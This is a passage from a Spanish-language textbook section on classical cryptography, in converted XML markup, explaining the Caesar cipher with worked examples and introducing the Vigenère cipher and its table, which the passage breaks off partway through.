role="section"><title><abbrev role="title-mark">20.5</abbrev><anchor 
   id="x1-31100020.5"  ></anchor>Criptograf&#x02CA;&#x0131;a cl&#x00E1;sica</title>
<!--l. 299--><para>
  </para><!--l. 299--><section 
role="subsection"><title><abbrev role="title-mark">20.5.1</abbrev><anchor 
   id="x1-31200020.5.1"  ></anchor>El sistema Caesar</title>
<!--l. 300--><para>  El cifrado Caesar (o C&#x00E9;sar) es uno de los m&#x00E1;s antiguos que se conocen. Debe su nombre al emperador Julio
C&#x00E9;sar, que presuntamente lo utiliz&#x00F3; para establecer comunicaciones seguras con sus generales durante las
Guerras G&#x00E1;licas.
<!--br/-->
<!--br/-->Matem&#x00E1;ticamente, para trabajar con el cifrado Caesar, tomamos el alfabeto <informalequation><graphic 
fileref="unixsec383x.gif"></graphic></informalequation> (enteros de m&#x00F3;dulo <informalequation><graphic 
fileref="unixsec384x.gif"></graphic></informalequation>).
Cuando <informalequation><graphic 
fileref="unixsec385x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec386x.gif"></graphic></informalequation> son primos entre s&#x02CA;&#x0131;, la aplicaci&#x00F3;n <informalequation><graphic 
fileref="unixsec387x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec388x.gif"></graphic></informalequation>, recibe el nombre de codi&#xFB01;caci&#x00F3;n m&#x00F3;dulo
m con par&#x00E1;metros a, b, donde el par <informalequation><graphic 
fileref="unixsec389x.gif"></graphic></informalequation> es la clave de este criptosistema. As&#x02CA;&#x0131;, trabajando con el alfabeto
ingl&#x00E9;s (para nosotros resulta conveniente tomar este alfabeto, de uso m&#x00E1;s extendido en inform&#x00E1;tica
que el espa~nol; la &#x00FA;nica diferencia radica en el uso de la letra &#x2018;~n&#x2019;), podemos tomar el alfabeto
de&#xFB01;nido por <informalequation><graphic 
fileref="unixsec390x.gif"></graphic></informalequation>, para lo cual asignamos a cada letra <informalequation><graphic 
fileref="unixsec391x.gif"></graphic></informalequation> un entero m&#x00F3;dulo 26, de la siguiente
forma:
</para><section role="center"><title/>
<!--l. 314--><para> </para><table ><informaltable><tgroup cols="6"><tbody><row><entry 
 align="center"><para> A=0 </para></entry><entry 
 align="center"><para> B=1 </para></entry><entry 
 align="center"><para> C=2 </para></entry><entry 
 align="center"><para>D=3 </para></entry><entry 
 align="center"><para> E=4 </para></entry><entry 
 align="center"><para> F=5 </para></entry>
 </row><row><entry 
 align="center"><para> G=6 </para></entry><entry 
 align="center"><para>H=7 </para></entry><entry 
 align="center"><para> I=8 </para></entry><entry 
 align="center"><para> J=9 </para></entry><entry 
 align="center"><para>K=10</para></entry><entry 
 align="center"><para>L=11</para></entry>
 </row><row><entry 
 align="center"><para>M=12</para></entry><entry 
 align="center"><para>N=13</para></entry><entry 
 align="center"><para>O=14</para></entry><entry 
 align="center"><para>P=15</para></entry><entry 
 align="center"><para>Q=16</para></entry><entry 
 align="center"><para>R=17</para></entry>
 </row><row><entry 
 align="center"><para> S=18 </para></entry><entry 
 align="center"><para>T=19</para></entry><entry 
 align="center"><para>U=20</para></entry><entry 
 align="center"><para>V=21</para></entry><entry 
 align="center"><para>W=22</para></entry><entry 
 align="center"><para>X=23</para></entry>
 </row><row><entry 
 align="center"><para>Y=24</para></entry><entry 
 align="center"><para>Z=25</para></entry><entry 
 align="center"><para>     </para></entry><entry 
 align="center"><para>     </para></entry><entry 
 align="center"><para>     </para></entry><entry 
 align="center"><para>     </para></entry>
 </row><row><entry 
 align="center"><para>        </para></entry>
 </row></tbody></tgroup></informaltable>

</section>
<!--l. 325--><para>El cifrado Caesar siempre utiliza la clave <informalequation><graphic 
fileref="unixsec392x.gif"></graphic></informalequation>, es decir, siempre tomaremos <informalequation><graphic 
fileref="unixsec393x.gif"></graphic></informalequation>. De esta forma, la anterior
aplicaci&#x00F3;n quedar&#x00E1; <informalequation><graphic 
fileref="unixsec394x.gif"></graphic></informalequation>, lo cual se traduce sencillamente en que para encriptar una letra hemos de
tomar su entero correspondiente y sumarle <informalequation><graphic 
fileref="unixsec395x.gif"></graphic></informalequation> (la clave del criptosistema) para obtener el texto cifrado.
An&#x00E1;logamente, y gracias al hecho de que <informalequation><graphic 
fileref="unixsec396x.gif"></graphic></informalequation> siempre ha de ser biyectiva, independientemente del valor de
<informalequation><graphic 
fileref="unixsec397x.gif"></graphic></informalequation>, para descifrar un texto tomamos la funci&#x00F3;n inversa, de&#xFB01;nida por <informalequation><graphic 
fileref="unixsec398x.gif"></graphic></informalequation>. Veamos
un ejemplo sencillo, en el que se toma <informalequation><graphic 
fileref="unixsec399x.gif"></graphic></informalequation>: queremos cifrar, con la clave <informalequation><graphic 
fileref="unixsec400x.gif"></graphic></informalequation>, la palabra
CESAR; en primer lugar, tomando el valor de cada letra, tenemos el equivalente num&#x00E9;rico de la
palabra:
</para><section role="center"><title/>
<!--l. 335--><para> </para><table ><informaltable><tgroup cols="5"><tbody><row><entry 
 align="center"><para>C</para></entry><entry 
 align="center"><para>E</para></entry><entry 
 align="center"><para>S </para></entry><entry 
 align="center"><para>A</para></entry><entry 
 align="center"><para>R</para></entry>
 </row><row><entry 
 align="center"><para>2</para></entry><entry 
 align="center"><para>4</para></entry><entry 
 align="center"><para>18</para></entry><entry 
 align="center"><para>0</para></entry><entry 
 align="center"><para>17</para></entry>
 </row><row><entry 
 align="center"><para>  </para></entry>
 </row></tbody></tgroup></informaltable></section>
<!--l. 344--><para>A cada uno de los n&#x00FA;meros anteriores le aplicamos la funci&#x00F3;n <informalequation><graphic 
fileref="unixsec401x.gif"></graphic></informalequation>, de forma que obtenemos el texto
cifrado:
</para><section role="center"><title/>
<!--l. 346--><para> </para><table ><informaltable><tgroup cols="5"><tbody><row><entry 
 align="center"><para>6</para></entry><entry 
 align="center"><para>8</para></entry><entry 
 align="center"><para>22</para></entry><entry 
 align="center"><para>4</para></entry><entry 
 align="center"><para>21</para></entry>
 </row><row><entry 
 align="center"><para>G</para></entry><entry 
 align="center"><para>I</para></entry><entry 
 align="center"><para>W</para></entry><entry 
 align="center"><para>E</para></entry><entry 
 align="center"><para>W</para></entry>
 </row><row><entry 
 align="center"><para>  </para></entry>
 </row></tbody></tgroup></informaltable></section>
<!--l. 355--><para>Este texto (GIWEV) es el resultado de cifrar la palabra CESAR con la clave elegida (<informalequation><graphic 
fileref="unixsec402x.gif"></graphic></informalequation>): es lo que
enviar&#x02CA;&#x0131;amos al receptor, que conociendo la clave acordada ser&#x02CA;&#x0131;a capaz de descifrarlo.
<!--br/-->
<!--br/-->Veamos ahora el ejemplo contrario: somos los receptores de un mensaje del que sabemos que ha sido
cifrado con la misma clave <informalequation><graphic 
fileref="unixsec403x.gif"></graphic></informalequation>, y buscamos descifrar la cadena que nos ha sido enviada, FVYXYW. El
valor de cada letra es
</para><section role="center"><title/>
<!--l. 361--><para> </para><table ><informaltable><tgroup cols="6"><tbody><row><entry 
 align="center"><para>F</para></entry><entry 
 align="center"><para>V</para></entry><entry 
 align="center"><para>Y</para></entry><entry 
 align="center"><para>X</para></entry><entry 
 align="center"><para>Y</para></entry><entry 
 align="center"><para>W</para></entry>
 </row><row><entry 
 align="center"><para>5</para></entry><entry 
 align="center"><para>21</para></entry><entry 
 align="center"><para>24</para></entry><entry 
 align="center"><para>23</para></entry><entry 
 align="center"><para>24</para></entry><entry 
 align="center"><para>22</para></entry>
 </row><row><entry 
 align="center"><para>  </para></entry>
 </row></tbody></tgroup></informaltable></section>
<!--l. 370--><para>Tomando <informalequation><graphic 
fileref="unixsec404x.gif"></graphic></informalequation>, tenemos el resultado
</para><section role="center"><title/>
<!--l. 371--><para> </para><table ><informaltable><tgroup cols="6"><tbody><row><entry 
 align="center"><para>1</para></entry><entry 
 align="center"><para>17</para></entry><entry 
 align="center"><para>20</para></entry><entry 
 align="center"><para>19</para></entry><entry 
 align="center"><para>20</para></entry><entry 
 align="center"><para>18</para></entry>
 </row><row><entry 
 align="center"><para>B</para></entry><entry 
 align="center"><para>R</para></entry><entry 
 align="center"><para>U</para></entry><entry 
 align="center"><para>T</para></entry><entry 
 align="center"><para>U</para></entry><entry 
 align="center"><para>S </para></entry>
 </row><row><entry 
 align="center"><para>  </para></entry>
 </row></tbody></tgroup></informaltable></section>
<!--l. 380--><para>Como vemos, retornando cada n&#x00FA;mero al alfabeto ingl&#x00E9;s obtenemos el texto en claro que nuestro emisor nos ha
enviado: BRUTUS, equivalente al cifrado FVYXYW.
<!--br/-->
<!--br/-->Si en el cifrado de un mensaje obtuvi&#x00E9;ramos que <informalequation><graphic 
fileref="unixsec405x.gif"></graphic></informalequation> (gen&#x00E9;ricamente, <informalequation><graphic 
fileref="unixsec406x.gif"></graphic></informalequation>), como trabajamos
con enteros de m&#x00F3;dulo <informalequation><graphic 
fileref="unixsec407x.gif"></graphic></informalequation>, deber&#x02CA;&#x0131;amos dividir <informalequation><graphic 
fileref="unixsec408x.gif"></graphic></informalequation> por <informalequation><graphic 
fileref="unixsec409x.gif"></graphic></informalequation>, considerando el resto entero como la cifra
adecuada. As&#x02CA;&#x0131;, si <informalequation><graphic 
fileref="unixsec410x.gif"></graphic></informalequation>, tomamos <informalequation><graphic 
fileref="unixsec411x.gif"></graphic></informalequation> (el resto de la divisi&#x00F3;n entera), por lo que
situar&#x02CA;&#x0131;amos una &#x2018;A&#x2019; en el texto cifrado.
<!--br/-->
<!--br/-->Es obvio que el cifrado Caesar tiene 26 claves diferentes (utilizando el alfabeto ingl&#x00E9;s), incluyendo la clave
de identidad (<informalequation><graphic 
fileref="unixsec412x.gif"></graphic></informalequation>), caso en el que el texto cifrado y el texto en claro son id&#x00E9;nticos. As&#x02CA;&#x0131; pues, no resultar&#x02CA;&#x0131;a
muy dif&#x02CA;&#x0131;cil para un criptoanalista realizar un ataque exhaustivo, buscando en el texto cifrado palabras en
claro con signi&#xFB01;cado en el lenguaje utilizado. Por este motivo, y por otros muchos, este criptosistema es
claramente vulnerable para un atacante, no ofreciendo una seguridad &#xFB01;able en la transmisi&#x00F3;n de datos
con&#xFB01;denciales.

  </para></section><!--end subsection--><!--l. 396--><section 
role="subsection"><title><abbrev role="title-mark">20.5.2</abbrev><anchor 
   id="x1-31300020.5.2"  ></anchor>El criptosistema de Vig&#x00E8;nere</title>
<!--l. 397--><para>  El sistema de cifrado de Vigen&#x00E8;re (en honor al cript&#x00F3;grafo franc&#x00E9;s del mismo nombre) es un sistema
polialfab&#x00E9;tico o de sustituci&#x00F3;n m&#x00FA;ltiple. Este tipo de criptosistemas aparecieron para sustituir a los
monoalfab&#x00E9;ticos o de sustituci&#x00F3;n simple, basados en el Caesar, que presentaban ciertas debilidades frente al
ataque de los criptoanalistas relativas a la frecuencia de aparici&#x00F3;n de elementos del alfabeto. El principal
elemento de este sistema es la llamada Tabla de Vigen&#x00E8;re, una matriz de caracteres cuadrada, con
dimensi&#x00F3;n <informalequation><graphic 
fileref="unixsec413x.gif"></graphic></informalequation>, que se muestra en la tabla  <ulink 
  url="#x1-3130011"  ><!--ref: vig--></ulink>.
<!--br/-->


</para><section role="center"><title/>
<!--l. 408--><para>
</para><!--l. 411--><para></para><table ><informaltable><tgroup cols="27"><tbody><row><entry 
 align="char"><para> </para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry>
</row><row><entry 
 align="char"><para>A</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry>
</row><row><entry 
 align="char"><para>B</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry>
</row><row><entry 
 align="char"><para>C</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry>
</row><row><entry 
 align="char"><para>D</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry>
</row><row><entry 
 align="char"><para>E</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry>
</row><row><entry 
 align="char"><para>F</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry>
</row><row><entry 
 align="char"><para>G</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry>
</row><row><entry 
 align="char"><para>H</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry>
</row><row><entry 
 align="char"><para>I</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry>
</row><row><entry 
 align="char"><para>J</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry>
</row><row><entry 
 align="char"><para>K</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry>
</row><row><entry 
 align="char"><para>L</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry>
</row><row><entry 
 align="char"><para>M</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry>
</row><row><entry 
 align="char"><para>N</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry>
</row><row><entry 
 align="char"><para>O</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry>
</row><row><entry 
 align="char"><para>P</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry>
</row><row><entry 
 align="char"><para>Q</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry>
</row><row><entry 
 align="char"><para>R</para></entry><entry 
